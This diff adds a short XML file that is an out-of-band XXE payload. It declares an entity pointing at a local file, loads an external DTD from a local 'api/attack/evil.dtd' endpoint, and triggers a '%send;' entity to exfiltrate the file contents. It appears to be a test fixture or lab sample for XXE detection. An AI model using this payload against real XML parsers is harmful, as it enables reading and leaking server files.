@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+
+<!DOCTYPE dtochkx [
+
+  <!ENTITY % file SYSTEM "abc.txt">
+
+  <!ENTITY % dtd SYSTEM "http://127.0.0.1:8088/api/attack/evil.dtd">
+
+%dtd;
+
+%send;
+
+]>
+
+<root>abcdefg</root>
